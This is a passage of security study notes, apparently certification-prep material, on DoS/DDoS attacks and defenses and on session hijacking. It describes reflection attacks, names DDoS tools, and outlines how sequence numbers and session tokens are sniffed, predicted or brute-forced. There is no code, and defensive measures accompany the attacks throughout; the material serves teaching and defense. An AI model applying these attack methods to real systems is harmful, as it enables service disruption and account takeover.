		- Because the vulnerability resides in the kernel stack, attackers can also use this method to target containers and virtual machines, further expanding the scope of the attack.
		- Countermeasures:
			- Implement Vulnerability Patching: Regularly update and patch Linux systems to address the vulnerabilities that enable TCP SACK panic attacks. This ensures the system is protected from known exploits.
			- Implement Firewall Rules: Configure firewalls to block incoming packets with the lowest MSS value (e.g., 48 bytes), which are commonly used in this type of attack.
	- Distributed Reflection DoS (DRDoS) Attack:
		- A Distributed Reflection Denial-of-Service (DRDoS) attack, also known as a "spoofed" attack, leverages multiple intermediary and secondary machines to amplify a DDoS attack on a target system or application. This attack exploits the TCP three-way handshake vulnerability to overwhelm the target with traffic.
		- A DRDoS attack involves four key components: an attacker machine, intermediary victims (zombies), secondary victims (reflectors), and a target machine. The attacker initiates the attack by sending requests to the intermediary hosts (zombies), which forward these requests to the secondary machines (reflectors). The reflectors then redirect the attack traffic to the target.
			- Attacker Machine: Initiates the attack
			- Intermediary Victims (Zombies): Compromised systems under the attacker's control
			- Secondary Victims (Reflectors): Non-compromised systems that reflect traffic
			- Target Machine: The system under attack
		- Process of DRDoS Attack:
			- The attacker commands intermediary victims (zombies) to send a stream of packets (TCP SYN) with the primary target’s IP address spoofed as the source IP. These packets are directed to non-compromised machines, known as secondary victims or reflectors, to deceive them into establishing a connection with the primary target.
			- The reflectors, believing the connection requests are legitimate, respond by sending a large volume of traffic (SYN/ACK packets) to the primary target, aiming to establish a new connection.
			- Since the primary target never initiated the connection, it discards the SYN/ACK packets received from the reflectors.
			- Meanwhile, the reflectors, expecting an ACK response from the primary target, assume the packets were lost and resend SYN/ACK packets to the target, repeating this process until a timeout occurs.
			- As a result, the primary target is overwhelmed with a massive volume of traffic from multiple reflectors, consuming its bandwidth and resources.
			- The combined bandwidth and traffic generated by the reflector machines effectively overwhelm the target, causing a denial of service.
		- Advantages of DRDoS Attacks:
			- Anonymity: The reflectors appear to be the attackers, making it nearly impossible to trace the actual attacker.
			- Amplification: The attack uses multiple intermediary and secondary victims to generate significant bandwidth, making it more effective than standard DDoS attacks.
		- Countermeasures:
			- Disable the Character Generator Protocol (CHARGEN) service to block this attack method.
			- Regularly update and patch servers to address vulnerabilities.
	- DDoS Extortion/Ransom DDoS (RDDoS) Attack:
		- A DDoS extortion attack, also known as a ransom DDoS (RDDoS) attack, involves attackers threatening target organizations with a DDoS attack and demanding a ransom payment. Attackers may send a ransom note or initiate a small-scale DDoS attack, often using a botnet, to demonstrate the legitimacy of their threat.
		- Typically, the attackers follow up with an email containing an extortion note that outlines the payment instructions, deadline, and potential consequences if the ransom is not paid. These notes often include additional threats, such as exposing vulnerabilities, sensitive assets, or data, along with detailed instructions for paying the ransom via digital currency. Attackers frequently exaggerate their capabilities, claiming to possess high-capacity DDoS tools capable of inflicting significant damage to the organization’s operations.
		- Countermeasures:
			- Deploy robust DDoS defense tools to detect and mitigate attacks.
			- Report immediately to law enforcement agencies and security teams upon receiving a ransom note.
			- Conduct regular risk assessments to evaluate asset vulnerabilities.
			- Implement mitigation strategies, such as BGP/DNS swing or always-on protection services.
- DoS/DDoS Attack Toolkits:
	- ISB : Attackers can use the ISB (I'm So Bored) software utility to launch DDoS attacks on a target network. The tool allows attackers to perform HTTP, UDP, TCP, and ICMP flood attacks. Additionally, it provides one-click access to commonly used network commands such as WHOIS, netstat, traceroute, and ping, which assist attackers in discovering and analyzing the target.
	- UltraDDOS-v2 : UltraDDOS-v2 is a DDoS tool that enables attackers to launch DDoS attacks on target websites or servers. The tool features a simple GUI interface where attackers can input the target IP address, port number, and the desired number of packets to transmit.

- DoS/DDoS Attack Countermeasures:
	- Detection Techniques:
		- A DoS/DDoS attack traffic detector must differentiate between genuine and bogus data packets, which is not always straightforward. There is always the possibility of confusion between traffic generated by legitimate network users and traffic generated by a DoS/DDoS attack.
		- Detection techniques focus on identifying and distinguishing between illegitimate traffic spikes and legitimate packet traffic. One challenge in filtering bogus traffic from legitimate traffic is the sheer volume of traffic. It is not feasible to scan each packet individually to ensure protection from a DoS/DDoS attack.
		- All detection techniques define an attack as an abnormal and significant deviation from the normal threshold of network traffic statistics and characteristics. These methods typically involve statistical analysis of deviations to classify traffic as either malicious or legitimate.
		- Types of Detection Techniques:
			- Activity Profiling:
				- Activity profiling is performed based on the average packet rate of network flows, which consist of consecutive packets sharing similar packet header information. The packet header information includes the IP addresses of the sender and destination, ports, and the transport protocols in use. Activity profiles are generated by monitoring this network packet header information.
				- An attack can be indicated by:
					- An increase in activity levels within network flow clusters.
					- An increase in the overall number of distinct clusters (indicating a potential DDoS attack).
				- For a higher average packet rate or activity level within a flow, the time between consecutive matching packets is shorter. Randomness in the average packet rate or activity level can signal suspicious activity. The entropy calculation method is used to measure this randomness. During an attack, the entropy of network activity levels tends to increase significantly.
				- One major challenge in the activity profiling method is the enormous volume of network traffic. This issue can be addressed by clustering packet flows with similar characteristics. Since DoS attacks typically generate a large number of highly similar data packets, a noticeable increase in the average packet rate or packet diversity could indicate a potential DoS attack.
			- Sequential Change-Point Detection:
				- The sequential change-point detection technique filters network traffic based on IP addresses, targeted port numbers, and communication protocols. The traffic flow data is stored as a graph showing the traffic flow rate over time. Change-point detection algorithms are then used to isolate changes in network traffic statistics and flow rates caused by potential attacks. A sudden, drastic change in traffic flow rate may indicate a DoS attack.
				- This technique employs the Cumulative Sum (CUSUM) algorithm to identify and locate DoS attacks. The algorithm calculates deviations between the actual and expected local average traffic in the time series. The sequential change-point detection technique is also effective at identifying typical scanning activities performed by network worms.
			- Wavelet-Based Signal Analysis:
				- The wavelet analysis technique examines network traffic by analyzing its spectral components. It decomposes incoming signals into various frequency bands and evaluates each frequency component separately. By analyzing the energy within each spectral window, anomalies can be detected. This technique identifies frequency components present at specific times and provides a description of those components. The presence of an unfamiliar frequency is often an indicator of suspicious network activity.
				- A network signal typically consists of time-localized data packet flow signals and background noise. Wavelet-based signal analysis filters out anomalous traffic flow signals from background noise. Normal network traffic usually exhibits low-frequency signals, whereas during an attack, the high-frequency components of the signal tend to increase.
	- DoS/DDoS Countermeasure Strategies:
		- Absorbing the Attack:
			- This strategy involves using additional capacity to absorb the attack, which requires careful preplanning and extra resources.
			- The primary disadvantage is the ongoing cost of maintaining additional resources, even when no attacks are occurring.
		- Degrading Services:
			- When it is not possible to maintain all services during an attack, prioritizing critical services is a practical approach.
			- In this strategy, critical services are identified in advance, and the network, systems, and application designs are customized to reduce or disable non-critical services. This ensures that critical services remain operational during an attack.
		- Shutting Down Services:
			- This strategy involves temporarily shutting down all services until the attack subsides. While not ideal, it can be a reasonable response in situations where maintaining services is impossible or would exacerbate the impact of the attack.
	- DDoS Attack Countermeasures: 
		- Protect Secondary Victims:
			- Individual Users: Preventing secondary systems from participating in DDoS attacks requires regular monitoring, updated antivirus and anti-Trojan software, and applying software patches to address vulnerabilities. Users should disable unnecessary services, uninstall unused applications, and scan external files. Built-in hardware and software defenses must be properly configured and updated to block DDoS agent software and traffic. These measures ensure attackers cannot exploit secondary systems.
			- Network Service Providers: Service providers and network administrators can adopt dynamic pricing models to encourage users to enhance their security and avoid becoming part of a DDoS attack network.
		- Detect and Neutralize Handlers:
			- Stopping DDoS attacks involves identifying and neutralizing handlers through traffic analysis, botnet disruption, and spoofed address detection. Handlers act as intermediaries for launching attacks. Analyzing traffic between handlers, clients, and agents can reveal infected nodes. Disabling handlers disrupts the attack network, as neutralizing a few handlers can render many agents ineffective. Detecting and filtering spoofed source addresses further mitigates DDoS attacks.
			- Network Traffic Analysis: Analyze communication protocols and traffic patterns between handlers and clients or handlers and agents to identify network nodes potentially infected by handlers.
			- Neutralize Botnet Handlers: Since the number of handlers is typically much smaller than the number of agents, neutralizing a few handlers can render multiple agents ineffective, disrupting DDoS attacks.
			- Spoofed Source Address: Spoofed source addresses in DDoS packets often do not correspond to valid sub-network addresses. Identifying and filtering these addresses can help mitigate the attack.
		- Prevent Potential Attacks:
			- Egress Filtering:
				- Egress filtering inspects the headers of IP packets leaving a network. Packets that meet the specified criteria are allowed to exit the sub-network, while those that fail are blocked, ensuring that unauthorized or malicious traffic does not leave the internal network.
				- DDoS attacks often involve spoofed IP addresses. Mitigation can be achieved by establishing protocols that ensure any outgoing packet has a source address matching the internal network. A well-configured sub-network firewall can further block many DDoS packets with spoofed source IP addresses.
				- Even with all available patches applied, a web server may remain vulnerable to zero-day attacks known only to underground hacker communities. However, enabling egress filtering can preserve system integrity by preventing the server from connecting back to the attacker. This reduces the effectiveness of many exploit payloads. By restricting outbound traffic to only necessary connections, egress filtering limits an attacker’s ability to exploit other systems or gain further access to the network.
			- Ingress Filtering:
				- Ingress filtering is a packet filtering technique employed by many Internet Service Providers (ISPs) to prevent source address spoofing in Internet traffic. By ensuring that incoming packets have legitimate and verifiable source addresses, ingress filtering helps make Internet traffic traceable to its true origin.
				- This technique indirectly combats various forms of network abuse, including flooding attacks originating from valid IP prefixes, and allows the source of the attack to be accurately identified.
			- TCP Intercept:
				- TCP intercept is a traffic-filtering feature used in routers to protect TCP servers from TCP SYN-flooding attacks, a type of DoS attack. In a SYN-flooding attack, the attacker sends a massive number of connection requests using unreachable return addresses. Since the return addresses are invalid, the connections cannot be established, leaving them unresolved. The server becomes overwhelmed by the large volume of unresolved connections, potentially denying service to legitimate requests. This can prevent users from connecting to websites, accessing email, using FTP services, and more.
				- Configuring TCP intercept features helps prevent DoS attacks by intercepting and validating TCP connection requests. In TCP intercept mode, the router intercepts SYN packets sent by clients to a server and compares them with an extended access list. If a match is found, the intercept software establishes a connection with the client on behalf of the server. Similarly, it establishes a connection with the server on behalf of the client. Once both half-connections are created, the intercept software transparently combines them. This process ensures that fake connection attempts are filtered out before reaching the server, with the intercept software acting as a mediator between the client and the server throughout the connection.
			- Rate Limiting:
				- Rate limiting is a technique used to control the rate of outbound or inbound traffic on a network interface controller. It is an effective method for reducing high volumes of inbound traffic that can lead to DDoS attacks. This technique is particularly crucial in hardware appliances, where it is configured to limit the rate of requests at layers 4 and 5 of the Open Systems Interconnection (OSI) model.
		- Deflect Attacks:
			- Systems configured with limited security, known as honeypots, are designed to attract attackers. Recent research shows that a honeypot can simulate all aspects of a network, including web servers, mail servers, and clients. These systems are deliberately set up with minimal security to draw the attention of DDoS attackers, serving as tools to gather information about their techniques, tools, and behaviors by recording system activities.
			- DDoS attackers attracted to a honeypot may install handlers or agent code within it, sparing more critical systems from compromise. Honeypots not only protect actual systems but also record detailed logs of attackers' activities, enabling the honeypot owner to track and analyze handler or agent behavior. This information can be used to bolster defenses against future DDoS attacks. A defense-in-depth approach, incorporating Internet Protocol Security (IPsec), can divert suspicious DoS traffic to multiple honeypots, enhancing security.
			- Types of Honeypots:
				- Low-Interaction Honeypots: Simulate specific services or applications with limited functionality to detect and log attacks.
				- High-Interaction Honeypots: Fully simulate entire systems or networks, allowing attackers to interact more extensively.
			- An example of a high-interaction honeypot is a honeynet. Honeynets simulate the complete layout of a computer network and are designed to "capture" attacks. Their goal is to create a controlled environment where all activities are monitored and recorded. Honeynets often contain decoy systems and even real computers running actual applications to deceive attackers and gather intelligence.
			- DoS/DDoS Countermeasure Honeypot Tools:
				- Blumira Honeypot Software (www.blumira.com) : Blumira honeypot software is a deception technology designed to help security professionals detect unauthorized access attempts and identify attackers’ lateral movement across an organization’s network, even if a breach has already occurred. It enhances an organization’s security posture by enabling early attack detection with minimal maintenance and overhead. When Blumira detects a honeypot security event, it promptly blocks the source IP at the switch or firewall level, mitigating potential threats effectively.

		- Mitigate Attacks:
			- Load Balancing:
				- Increase bandwidth on critical connections to absorb the additional traffic generated by an attack. Bandwidth providers can scale up bandwidth on critical connections during a DDoS attack to prevent server shutdowns. Using a replicated server model provides additional fail-safe protection.
				- Replicated servers improve load management by balancing traffic/load across multiple servers in a multiple-server architecture. This approach not only enhances normal network performance but also helps mitigate the impact of DDoS attacks.
			- Throttling:
				- Configure routers to access a server with logic that throttles incoming traffic to safe levels for the server. Throttling involves setting up routers with rules that limit the incoming traffic to levels the server can handle. The "min-max fair server-centric router" throttles, which control minimum and maximum throughput, help prevent server shutdowns.
				- Throttling protects servers by managing DoS traffic and preventing damage. This method allows routers to handle heavy incoming traffic, ensuring the server can process it. It also helps filter legitimate user traffic from malicious DDoS attack traffic, allowing only legitimate traffic to pass through for better results. A major limitation of this approach is that it may trigger false alarms, occasionally allowing malicious traffic to bypass while blocking some legitimate traffic.
			- Drop Requests:
				- In this technique, servers and routers drop packets when the load increases, typically performed by the router or server. Before processing a request, the system may induce the requester to drop it by requiring them to solve a complex puzzle that demands significant memory or computational power.
				- This forces the requester to abandon the request if they cannot solve the puzzle. As a result, users of compromised systems (zombie systems) may experience performance degradation, potentially dissuading them from participating in transferring DDoS attack traffic.
		- Post-Attack Forensics:
			- Traffic Pattern Analysis:
				- During a DDoS attack, the traffic pattern tool collects post-attack data, which users can analyze to identify characteristics unique to the attacking traffic. The results of this analysis help update load balancing and throttling countermeasures, improving both efficiency and protection.
				- Traffic pattern analysis also assists network administrators in developing new filtering techniques to block DDoS attack traffic from entering or leaving their networks. Furthermore, analyzing DDoS traffic patterns helps administrators ensure that attackers cannot use their servers as a platform to launch attacks on other sites.
			- Packet Traceback:
				- Packet traceback involves tracing attack traffic back to its source, similar to reverse engineering. In this method, the targeted victim works backward, tracing the packets to their origin. Once the true source is identified, the victim can take steps to block further attacks from that source by implementing the necessary preventive measures.
				- Additionally, packet traceback can provide valuable insights into the tools and techniques used by the attacker. This information can help in developing and implementing various filtering techniques to block future attacks.
			- Event Log Analysis:
				- DDoS event logs play a crucial role in forensic investigations and law enforcement, especially when an attacker causes significant financial damage. Providers can use honeypots and other network security mechanisms, such as firewalls, packet sniffers, and server logs, to store all events that occurred during the setup and execution of the attack. This allows network administrators to identify the type of DDoS attack or the combination of attacks used.
				- Logs from routers, firewalls, and intrusion detection systems (IDS) can be analyzed to trace the source of the DoS traffic. Additionally, network administrators can work with intermediary ISPs and law enforcement agencies to trace the attacker’s IP address.
	- Techniques to Defend Against Botnets:
		- RFC 3704 Filtering:
			- RFC 3704 is a basic access control list (ACL) filter designed to limit the impact of DDoS attacks by blocking traffic with spoofed addresses. This filter ensures that packets come from valid, allocated address space that matches the network topology and address allocation.
			- A "bogon list" includes all unused or reserved IP addresses that should not originate from the Internet. Any traffic coming from these unused or reserved IP addresses is considered bogus and should be filtered by the ISP before it enters the Internet link. If a packet is sourced from an IP address on the bogon list, it is likely from a spoofed source and should be dropped by the filter.
			- System administrators should verify that their ISP performs RFC 3704 filtering in the cloud before traffic enters their systems. Since the bogon list changes regularly, if the ISP does not perform RFC 3704 filtering, the system administrator must manage their own bogon ACL rules or switch to another ISP.
		- Cisco IPS Source IP Reputation Filtering:
			- Reputation services help determine whether an IP address or service is a source of threat. Cisco Global Correlation, a security feature of Cisco IPS 7.0, leverages extensive security intelligence. The Cisco SensorBase Network contains data on all known Internet threats, including botnets, malware outbreaks, dark nets, and botnet harvesters. Cisco IPS utilizes this network to filter DoS traffic before it can harm critical assets. To detect and prevent malicious activity even earlier, it integrates global threat data into its system.
		- Black Hole Filtering:
			- Black-hole filtering is a common technique used to defend against botnets and prevent DoS attacks. Black holes refer to network nodes where incoming traffic is discarded or dropped without notifying the source that the data did not reach its intended recipient.
			- Undesirable traffic can be dropped before it enters a protected network using a method called remotely triggered black-hole (RTBH) filtering. Since this is a remotely triggered process, it must be implemented in collaboration with the ISP. RTBH filtering utilizes Border Gateway Protocol (BGP) host routes to direct traffic to the victim’s servers to a "null0" next hop, effectively discarding it.
		- DDoS Prevention Offerings from ISP or DDoS Service:
			- This method is effective in preventing IP spoofing at the ISP level. The ISP scrubs or cleans traffic before allowing it to enter a user’s Internet link. Since this service operates in the cloud, DDoS attacks do not saturate the Internet links. Additionally, some third-party providers offer cloud-based DDoS prevention services.
			- IP Source Guard (in Cisco) or similar features in other routers can be enabled to filter traffic based on the DHCP snooping binding database or IP source bindings, preventing bots from sending spoofed packets.
	- Additional DoS/DDoS Countermeasures:
		- Use WPA2/WPA3 and AES 256 encryption to defend against eavesdropping.
		- Keep software and protocols updated, and scan for anomalies.
		- Update the kernel and disable unused or insecure services.
		- Block inbound packets from service ports to prevent reflection attacks.
		- Enable TCP SYN cookie protection and prevent spoofed packets at the ISP level.
		- Use cognitive radios to handle jamming and scrambling attacks.
		- Block ICMP traffic via firewalls and secure remote administration.
		- Perform input validation and avoid unsafe functions like gets and strcpy.
		- Monitor the network perimeter with advanced surveillance tools.
		- Ensure timeout functions for semi-accessible connections.
		- Implement distributed server models and colocation services to reduce server overload.
		- Ensure servers are free from bottlenecks and failure points.
		- Use third-party services for enhanced DDoS protection.
		- Adopt multi-cloud models for application backup during DDoS attacks.
		- Simulate DoS/DDoS attacks to prepare countermeasures.
		- Share threat intelligence with peers and stay updated on attack trends.
		- Use AI/ML for anomaly detection and limit network broadcasting.
		- Disable unnecessary services like echo and chargen.
	- DoS/DDoS Protection at ISP Level:
		- One of the most effective ways to defend against DoS attacks is to block them at the gateway, a task typically handled by the contracted ISP. ISPs offer a "clean pipes" service-level agreement (SLA), which guarantees bandwidth for legitimate traffic rather than for all incoming traffic. In many cases, ISPs block all requests during a DDoS attack, even legitimate ones. If an ISP does not offer clean-pipes services, cloud-based subscription services can be used instead.
		- These services act as intermediaries, receiving traffic destined for the network, filtering it, and forwarding only trusted connections. Providers such as Imperva and VeriSign offer cloud protection against DoS attacks.
		- ISPs also offer in-the-cloud DDoS protection for Internet links to prevent saturation during an attack. This protection redirects attack traffic to the ISP’s infrastructure, where it can be filtered. Administrators can request that the ISP block the original affected IP and move their site to a new IP after performing DNS propagation.
	- Enabling TCP Intercept on Cisco IOS Software:
		- TCP intercept can be enabled by executing commands in global configuration mode.
		- An access list serves three purposes:
			- Interception of all connection requests.
			- Interception of requests originating from specific networks.
			- Interception of requests destined for specific servers.
		- Typically, an access list defines the source as any and the destination as specific networks or servers. Since identifying the source of intercepted packets is unnecessary, source addresses are not filtered. Instead, the destination server or network to be protected is specified. TCP intercept can operate in either active intercept mode or passive watch mode, with the default being intercept mode.
		- Active Intercept Mode: In this mode, the Cisco IOS software actively intercepts all inbound connection requests (SYN) and responds with a SYN-ACK on behalf of the server. It then waits for an ACK from the client. Upon receiving the ACK, the software completes the three-way handshake with the server by sending the original SYN. Once the handshake is complete, the two half connections (client-to-software and software-to-server) are linked.
		- Passive Watch Mode: In this mode, connection requests pass directly to the server without active interception. The software monitors the connection setup. If the connection fails to establish within 30 seconds, the software sends a reset request to the server to clear its state.

# Session Hijacking

- When a web server successfully authenticates a client, it generates a session identification token or key, which is sent to the client. These session tokens are used to differentiate and manage multiple active sessions on the server. Web servers typically rely on mechanisms to generate random tokens and implement security controls to protect these tokens during transmission.
- Session hijacking is a type of cyberattack where an attacker takes control of an active Transmission Control Protocol (TCP) session between two computers. Since most authentication processes occur only at the start of a TCP session, an attacker can exploit this vulnerability to gain unauthorized access to a system while the session is ongoing. By intercepting and analyzing the traffic of an established TCP session, attackers can steal sensitive information, commit identity theft, or engage in fraudulent activities.
- This attack often targets weaknesses in the session-token generation process or token security measures, allowing the attacker to acquire a valid session ID. With a stolen or guessed session ID, the attacker can impersonate the legitimate user and establish an unauthorized connection to the target server. Once this connection is established, the web server unknowingly processes the attacker’s requests as if they originated from the authenticated user. Session hijacking can enable attackers to launch various other forms of attacks, such as man-in-the-middle (MITM) attacks and denial-of-service (DoS) attacks.
- Factors Contributing to Session Hijacking:
	- Absence of Account Lockout for Invalid Session IDs:
		- If a website does not implement account lockout mechanisms, attackers can repeatedly attempt to connect using varying session IDs embedded in legitimate URLs. This process, known as a brute-force attack, allows attackers to try multiple session IDs until they identify the correct one. During such attacks, the web server often fails to display warning messages or impose restrictions, enabling the attacker to eventually determine a valid session ID.
	- Weak Session-ID Generation Algorithms or Short Session IDs:
		- Many websites use linear or predictable algorithms to generate session IDs, often relying on easily guessed variables such as timestamps or IP addresses. By analyzing patterns and sending multiple requests, attackers can narrow the search space to forge a valid session ID. Even when a robust algorithm is used, short session IDs reduce the complexity of guessing or brute-forcing the ID, making them more vulnerable to attack.
	- Insecure Handling of Session IDs:
		- Attackers can exploit vulnerabilities in the handling of session IDs to retrieve stored information. For instance, by misleading a user’s browser into visiting a malicious site, attackers can intercept session IDs before they expire. Techniques like DNS poisoning, cross-site scripting (XSS), or exploiting browser vulnerabilities allow attackers to misuse session IDs for unauthorized access.
	- Indefinite Session Timeout:
		- Session IDs that do not have a set expiration time give attackers unlimited opportunities to guess or steal a valid session ID. For example, the "remember me" option on many websites may lead to static session IDs, which attackers can exploit if they gain access to a user’s cookie file. Additionally, if attackers compromise a proxy server that logs or caches session IDs, they can hijack sessions more easily.
	- Vulnerability of TCP/IP Protocol:
		- All machines using TCP/IP are inherently vulnerable to session hijacking due to design flaws in the protocol. These flaws allow attackers to intercept and manipulate communication between clients and servers.
	- Lack of Encryption:
		- Most countermeasures against session hijacking fail without proper encryption. On unsecured networks, attackers can easily sniff session IDs during transmission if transport-layer security, such as Secure Sockets Layer (SSL) or Transport Layer Security (TLS), is not properly configured. Even when encryption is used, attackers can gain access if session IDs include sensitive information, such as login credentials.
- Session Hijacking Process:
	- Session hijacking allows attackers to take over an active session after user authentication. Once hijacked, the attacker can redirect traffic, plant backdoors, or access sensitive data without raising suspicion.
	- The process typically involves three phases:
		- Tracking the Connection: The attacker uses tools like network sniffers or Nmap to monitor the victim’s session and capture TCP sequence (SEQ) and acknowledgment (ACK) numbers. These numbers are then used to craft valid packets to impersonate the victim.
		- Desynchronizing the Connection:
			- The attacker disrupts the SEQ/ACK synchronization between the target and server by:
			- Sending Null Data: Advances the server’s SEQ/ACK numbers, desynchronizing the session.
			- Resetting the Connection: Sends an RST flag to terminate the server’s connection with the target, then establishes a new connection with the server using spoofed packets.
			- Avoiding Detection: Keeps the target unaware by ensuring responses from the server appear normal. Poor desynchronization may cause excess network traffic (e.g., ACK storms), revealing the attack.
		- Injecting Malicious Packets:
			- Once in control, the attacker can:
			- Inject Data: Send commands or malicious payloads to the server.
			- Act as a Man-in-the-Middle: Intercept, modify, or relay data between the target and server while maintaining control over the session.
	- Effective encryption, secure session management, and monitoring are crucial to prevent session hijacking.
- Packet Analysis of Local Session Hijack:
	- Session hijacking leverages high-level attack vectors that can compromise numerous systems. Since many systems rely on TCP for data transmission over LANs or the Internet, attackers exploit vulnerabilities in the TCP three-way handshake to take control of active sessions.
	- An attacker begins by sniffing network traffic to monitor or track an ongoing session. The next step is to desynchronize the session. If the attacker knows the Next Sequence Number (NSN) used by the client, they can hijack the session by sending a packet with the NSN before the client uses it.
	- There are two main methods to determine sequence numbers:
		- Sniffing Traffic: By capturing an ACK packet during the session, the attacker can calculate the NSN based on the information in the packet.
		- Guessing Sequence Numbers: The attacker guesses sequence numbers and sends packets with those guesses. However, this method is unreliable and less effective compared to sniffing.
	- If the attacker has access to the network and can sniff the TCP session, determining the sequence number becomes straightforward. This form of session hijacking is referred to as "local session hijacking."
- Types of Session Hijacking:
	- Session hijacking can be classified into two types based on the attacker’s involvement: active and passive. The key distinction is that an active hijack involves taking control of an existing session, while a passive hijack focuses on monitoring the session without interference.
	- Passive Session Hijacking:
		- In a passive attack, the attacker observes and records traffic during an active session without disrupting it. Using network sniffers, attackers can capture sensitive information such as user IDs and passwords, which they can later exploit to log in as a legitimate user and gain privileges.
		- Example: Password sniffing, a common method for gaining raw access to a network.
		- Countermeasures: Techniques like one-time passwords (e.g., S/KEY) and ticketing systems (e.g., Kerberos) can prevent sniffing attacks. However, these measures do not protect against active attacks if data is unencrypted or lacks a digital signature.
	- Active Session Hijacking:
		- In an active attack, the attacker takes control of an existing session by disrupting the connection or directly participating in the session.
		- Example: A Man-in-the-Middle (MITM) attack, where the attacker intercepts and manipulates data between the server and client. To execute this, the attacker must predict the sequence number before the target responds to the server.
		- Modern Challenges: Most modern operating systems use randomized initial sequence numbers, making sequence-number prediction significantly harder.
- Session Hijacking in the OSI Model:
	- Session hijacking can occur at two levels in the OSI model: the network level and the application level.
	- Network-Level Hijacking:
		- Network-level hijacking involves intercepting packets during the transmission between a client and server in a TCP or User Datagram Protocol (UDP) session. A successful attack enables the attacker to gather critical information, which can be further used to compromise application-level sessions.
		- Attackers often target the network level because it does not require tailoring the attack for each specific web application. Instead, this method focuses on the shared protocol data flow common across all web applications.
	- Application-Level Hijacking:
		- Application-level hijacking involves gaining control over the Hypertext Transfer Protocol (HTTP) user session by obtaining session IDs. At this level, the attacker gains control of an existing session or creates new, unauthorized sessions by using the stolen data.
		- In general, network-level and application-level hijacking are used together, depending on the system being targeted.
- Spoofing vs. Hijacking:
	- Blind Hijacking: Blind hijacking involves predicting TCP sequence numbers to impersonate a host without observing reply packets. Attackers rely on sequence-number prediction to hijack communications, exploiting trust between users and machines. Since ARP poisoning and observing replies are impractical across networks, attackers must anticipate responses while preventing TCP/RST packets from the host.
	- Spoofing Attacks: In spoofing, attackers impersonate users or machines to gain access by initiating new sessions with stolen credentials. IP spoofing, a simple technique, requires predicting sequence numbers to establish connections. However, spoofing without session hijacking doesn’t require sequence prediction and often involves source routing to intercept traffic. Active hijacking displaces legitimate users from sessions, leveraging their privileges, while session spoofing uses stolen authentication credentials to start new sessions.
	- Session Hijacking: Session hijacking occurs when attackers take over active sessions after legitimate users authenticate. Displacement often involves DoS attacks, with attackers needing precise knowledge of session state and TCP sequence numbers. This method is more complex than IP spoofing due to the control required.
	- Defenses Against Spoofing and Hijacking: Encryption (SSL, PPTP) and per-packet integrity checking prevent spoofing and hijacking by securing communications and sequence integrity. Without encryption, attackers can exploit non-encrypted TCP traffic by sniffing, predicting sequence numbers, and using ARP cache poisoning on local networks.
- Application-Level Session Hijacking:
	- In application-level session hijacking, an attacker steals or predicts a valid session token to gain unauthorized access to a web server or create a new unauthorized session. Typically, network-level and application-level session hijacking occur together because a successful network-level session hijack provides an attacker with sufficient information to perform application-level session hijacking. Application-level session hijacking primarily relies on HTTP sessions.
	- Techniques To Obtain Valid Session ID:
		- Stealing: Attackers may gain physical access to retrieve files containing session IDs or memory contents from the user’s system or the server. Alternatively, attackers can use sniffing tools like Wireshark or Riverbed Packet Analyzer Plus to capture traffic between the client and server, extracting session IDs from intercepted packets.
		- Guessing: Attackers attempt to guess session IDs by analyzing session variables. In session hijacking scenarios, the range of possible session ID values that can be guessed is often limited. Consequently, guessing is effective only when servers employ weak or flawed session ID generation mechanisms.
		- Brute Forcing: In a brute-force attack, an attacker systematically attempts all possible permutations of session ID values until finding one that is valid. For example, an attacker using a digital subscriber line (DSL) can generate up to 1,000 session IDs per second. This technique is particularly effective when the session ID generation algorithm is non-random. If the predicted range of session ID values is small, this attack is referred to as a session prediction attack.
	- Session Token Compromise Methods:
		- Session Sniffing
		- Predictable Session Tokens
		- Man-in-the-Middle (MITM) Attacks
		- Man-in-the-Browser Attacks
		- Cross-Site Scripting (XSS) Attacks
		- Cross-Site Request Forgery (CSRF) Attacks
		- Session Replay Attacks
		- Session Fixation Attacks
		- CRIME Attacks
		- Forbidden Attacks
		- Session Donation Attacks
		- PetitPotam Hijacking
	- Compromising Session IDs Using Sniffing:
		- A web server identifies a user’s connection through a unique session ID (also known as a session token). After successful authentication during client login, the web server sends a session token to the client browser. Typically, a session token consists of a variable-length string and can be utilized in several ways, such as in the header of an HTTP request (cookie), within a URL, or in the body of an HTTP request.
		- Attackers can use packet-sniffing tools, such as Wireshark and Riverbed Packet Analyzer Plus, to intercept HTTP traffic between a victim and the web server. By analyzing the captured packets, attackers can extract valuable information, including session IDs and passwords. Once the session ID is identified, the attacker can impersonate the victim by sending the stolen session ID to the web server before the victim does. This allows the attacker to use the valid session token to gain unauthorized access to the web server. In this way, the attacker takes control of an existing legitimate session.
	- Compromising Session IDs by Predicting Session Tokens:
		- A session ID serves as proof of an authenticated session established between a user and a web server. If an attacker can guess or predict a user’s session ID, fraudulent activity becomes possible. Session prediction allows an attacker to bypass the authentication mechanisms of an application. Typically, attackers exploit session IDs generated by weak algorithms to impersonate legitimate website users. They analyze the variable section of session IDs to detect patterns. This analysis may be conducted manually or through the use of cryptanalytic tools.
		- An attacker gathers a large number of simultaneous session IDs to collect samples within the same time window while keeping certain variables constant. Initially, the attacker collects valid session IDs to identify patterns that authenticate users. The attacker then examines the structure of the session ID, the information used to generate it, and the algorithm employed by the web application for security. Using these insights, the attacker can predict the session ID.
		- In addition to prediction, attackers may also use brute-force techniques to guess session IDs. This involves generating and testing multiple session ID values until they successfully gain unauthorized access to the application.
		- Predict Session Token:
			- Most web servers generate session IDs using either custom algorithms or predefined patterns, which may simply increment static numbers. Others, however, employ more complex procedures that incorporate factors such as time and other system-specific variables.
			- The attacker can carry out an attack through the following steps:
				- The attacker obtains the current session ID and connects to the web application.
				- The attacker uses a brute-force technique or calculates the next session ID.
				- The attacker modifies the current session ID value in the cookie, URL, or hidden form field to impersonate the next user’s identity.
			- Analyzing Token Patterns:
				- Sequential Tokens: When session tokens are issued sequentially (e.g., 001, 002, 003), attackers can observe the series of tokens to identify patterns. If an attacker notices that the tokens increment by one each time, they can predict the next token by simply adding 1 to the last observed token.
				- Timestamp-Based Tokens: Tokens that include predictable elements, such as timestamps, are easier to predict. If a token incorporates a timestamp, an attacker can estimate the token value based on the current time.
			- Brute-Force Attacks:
				- Small Token Space Size: If the token space (the total number of possible tokens) is small, brute-force attacks become feasible. Attackers can systematically attempt all possible token values until they find a valid one. For example, tokens ranging from 0000 to 9999 are limited to just 10,000 possible values. An attacker can write a script to try each of these values until a match is found.
				- Lack of Rate-Limiting: Without rate-limiting, attackers can generate and test numerous tokens without being blocked. This enables them to perform brute-force attacks more efficiently. For example, an attacker could attempt 1,000 tokens per minute. Without rate-limiting in place, they can continue indefinitely until a valid token is found.
			- Weak Random Number Generators:
